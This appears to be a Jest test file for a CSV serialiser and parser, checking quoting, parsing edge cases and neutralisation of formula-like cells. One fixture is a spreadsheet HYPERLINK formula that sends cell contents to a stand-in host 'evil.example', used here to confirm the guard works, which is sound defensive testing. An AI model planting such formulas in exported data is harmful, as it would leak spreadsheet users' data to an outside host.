import { parseCsv, toCsv } from './csv';

describe('csv', () => {
  it('serialises with quoting for commas, quotes and line breaks', () => {
    const out = toCsv(
      [{ a: 'plain', b: 'has, comma', c: 'say "hi"', d: 'two\nlines', e: null }],
      [
        { header: 'A', value: (r) => r.a },
        { header: 'B', value: (r) => r.b },
        { header: 'C', value: (r) => r.c },
        { header: 'D', value: (r) => r.d },
        { header: 'E', value: (r) => r.e },
      ],
    );
    expect(out).toBe('A,B,C,D,E\r\nplain,"has, comma","say ""hi""","two\nlines",\r\n');
  });

  it('neutralises cells a spreadsheet would evaluate as a formula', () => {
    const out = toCsv(
      [
        {
          name: '=HYPERLINK("https://evil.example/?"&A1,"open")',
          ref: '+1234',
          note: '@SUM(A1)',
          neg: '-5 items',
          amount: -1250.5,
          plain: 'Acme Trading',
        },
      ],
      [
        { header: 'Name', value: (r) => r.name },
        { header: 'Ref', value: (r) => r.ref },
        { header: 'Note', value: (r) => r.note },
        { header: 'Neg', value: (r) => r.neg },
        { header: 'Amount', value: (r) => r.amount },
        { header: 'Plain', value: (r) => r.plain },
      ],
    );
    const [, row] = out.split('\r\n');
    // Text starting like a formula is prefixed with an apostrophe (shown literally by Excel /
    // LibreOffice / Sheets) and quoted; numbers pass through untouched.
    expect(row).toBe(
      `"'=HYPERLINK(""https://evil.example/?""&A1,""open"")","'+1234","'@SUM(A1)","'-5 items",-1250.5,Acme Trading`,
    );
    // A neutralised cell round-trips through the parser with its guard intact - the reader
    // sees the literal text, never a formula.
    expect(parseCsv(out).rows[0]!.values.Name).toBe(
      `'=HYPERLINK("https://evil.example/?"&A1,"open")`,
    );
  });

  it('parses quoted fields, escaped quotes, embedded newlines, CRLF and a BOM', () => {
    const text =
      '﻿code,name,notes\r\n1000,"Cash, on hand","line 1\nline 2"\r\n1100,Bank,"He said ""ok"""\r\n\r\n';
    const parsed = parseCsv(text);
    expect(parsed.headers).toEqual(['code', 'name', 'notes']);
    expect(parsed.rows).toHaveLength(2);
    expect(parsed.rows[0]).toEqual({
      line: 2,
      values: { code: '1000', name: 'Cash, on hand', notes: 'line 1\nline 2' },
    });
    expect(parsed.rows[1]!.values.notes).toBe('He said "ok"');
    // The embedded newline shifts the file line of the next record.
    expect(parsed.rows[1]!.line).toBe(4);
  });

  it('keeps extra cells and honours the row cap', () => {
    const parsed = parseCsv('a,b\n1,2,3\n4,5\n6,7\n', { maxRows: 2 });
    expect(parsed.rows).toHaveLength(2);
    expect(parsed.rows[0]!.values).toEqual({ a: '1', b: '2', _extra1: '3' });
  });

  it('round-trips', () => {
    const rows = [{ x: 'a,b', y: '"q"' }];
    const columns = [
      { header: 'x', value: (r: (typeof rows)[number]) => r.x },
      { header: 'y', value: (r: (typeof rows)[number]) => r.y },
    ];
    const parsed = parseCsv(toCsv(rows, columns));
    expect(parsed.rows[0]!.values).toEqual(rows[0]);
  });
});
